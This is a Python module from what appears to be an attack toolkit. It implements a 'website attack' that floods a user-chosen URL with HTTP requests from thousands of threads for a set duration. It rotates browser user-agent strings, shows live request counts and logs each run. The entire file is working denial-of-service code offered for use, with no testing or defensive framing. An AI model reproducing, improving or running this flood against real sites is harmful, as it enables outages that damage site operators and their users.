import threading
import time
import urllib.request
import random
from modules.utils import pcolor, resolve
from modules.logger import save_log

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/120.0',
]

def http_flood(url, stop, stats):
    while not stop.is_set():
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            req = urllib.request.Request(url, headers=headers)
            urllib.request.urlopen(req, timeout=3)
            stats['p'] += 1
        except:
            stats['e'] += 1

def website_attack():
    pcolor("b", "\n[ WEBSITE ATTACK ]\n")
    url = input("URL (https://example.com): ")
    domain = url.replace("https://", "").replace("http://", "").split("/")[0]
    
    ip = resolve(domain)
    if not ip:
        input("Press Enter...")
        return
    
    threads = int(input("Threads (3000): ") or 3000)
    duration = int(input("Duration sec (60): ") or 60)
    
    print(f"\nTarget: {url}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s")
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm != 'y':
        return
    
    stop = threading.Event()
    stats = {'p': 0, 'e': 0}
    
    for _ in range(threads):
        threading.Thread(target=http_flood, args=(url, stop, stats), daemon=True).start()
    
    pcolor("g", f"\n[!] ATTACK STARTED on {url}")
    start = time.time()
    
    try:
        while time.time() - start < duration:
            remaining = int(duration - (time.time() - start))
            print(f"\r[LIVE] Requests: {stats['p']} | Errors: {stats['e']} | Time: {remaining}s    ", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        pcolor("y", "\n[!] Stopping...")
    finally:
        stop.set()
        pcolor("g", f"\n\n[+] ATTACK FINISHED")
        print(f"Requests sent: {stats['p']}")
        print(f"Errors: {stats['e']}")
        save_log(url, 443, "HTTP_FLOOD", threads, duration, stats['p'], stats['e'])
    
    input("\nPress Enter...")
